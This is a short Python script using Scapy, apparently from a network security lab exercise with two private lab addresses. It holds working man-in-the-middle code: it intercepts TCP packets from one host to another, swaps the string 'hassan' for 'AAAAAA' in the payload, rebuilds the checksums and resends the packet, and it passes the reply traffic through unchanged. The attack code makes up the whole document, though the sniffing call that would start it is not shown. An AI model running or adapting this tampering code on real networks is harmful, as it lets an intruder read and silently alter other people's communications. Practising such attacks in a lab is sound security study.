from scapy.all import *

VM_A_IP = '10.9.0.5'
VM_B_IP = '10.9.0.6'

def spoof_pkt(pkt):
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print('*** %s, length %d' % (data, len(data)))
        newpkt = IP(pkt[IP])
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        newdata = data.replace(b'hassan', b'AAAAAA')
        newpkt = newpkt/newdata
        
        send(newpkt)
    
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        newpkt = pkt[IP]
        send(newpkt)
        
